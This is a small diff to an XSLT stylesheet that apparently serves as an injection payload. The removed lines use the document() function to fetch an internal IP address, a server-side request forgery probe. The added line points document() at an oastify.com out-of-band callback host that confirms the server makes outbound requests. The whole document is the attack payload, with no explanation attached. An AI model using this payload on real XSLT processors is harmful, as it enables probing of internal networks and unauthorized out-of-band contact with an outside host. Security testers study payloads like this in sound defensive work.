@@ -3,9 +3,7 @@
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 
 <xsl:template match="/">
-  <output>
-    <xsl:value-of select="document('http://10.113.142.31/')"/>
-  </output>
+  <xsl:value-of select="document('https://1y04pg3zrs2xk7eydlgyp7lpqgw7kz8o.oastify.com')"/>
 </xsl:template>
 
 </xsl:stylesheet>
